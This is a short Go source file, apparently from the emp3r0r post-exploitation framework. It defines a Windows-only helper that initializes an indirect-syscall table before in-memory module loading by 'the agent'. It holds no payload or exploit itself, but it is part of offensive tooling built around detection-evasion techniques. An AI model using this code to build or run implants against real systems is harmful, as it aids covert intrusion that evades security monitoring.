//go:build windows

package script

import ntsyscall "github.com/jm33-m0/emp3r0r/core/lib/syscall"

// memLoadPrepare initializes the global indirect-syscall table used by memmod
// if it has not been set up yet (the agent normally initializes it at startup).
func memLoadPrepare() error {
	_, err := ntsyscall.GetRuntimeSyscallTable()
	return err
}
